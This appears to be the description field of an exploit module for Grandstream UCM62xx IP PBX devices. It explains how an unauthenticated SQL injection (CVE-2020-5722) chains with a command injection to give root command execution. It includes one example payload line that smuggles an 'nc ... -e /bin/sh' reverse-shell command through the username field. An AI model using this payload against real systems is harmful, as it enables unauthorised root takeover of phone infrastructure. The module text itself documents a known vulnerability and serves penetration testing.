	"description": "This module exploits an unauthenticated SQL injection vulnerability (CVE-2020-5722) and\n          a command injection vulnerability (technically, no assigned CVE but was inadvertently\n          patched at the same time as CVE-2019-10662) affecting the Grandstream UCM62xx IP PBX\n          series of devices. The vulnerabilities allow an unauthenticated remote attacker to\n          execute commands as root.\n\n          Exploitation happens in two stages:\n\n          1. An SQL injection during username lookup while executing the \"Forgot Password\" function.\n          2. A command injection that occurs after the user provided username is passed to a Python script\n          via the shell. Like so:\n\n          /bin/sh -c python /app/asterisk/var/lib/asterisk/scripts/sendMail.py \\\n          password '' `cat <<'TTsf7G0' z' or 1=1--`;`nc 10.0.0.3 4444 -e /bin/sh`;` TTsf7G0 `\n\n          This module affect UCM62xx versions before firmware version 1.0.19.20.",
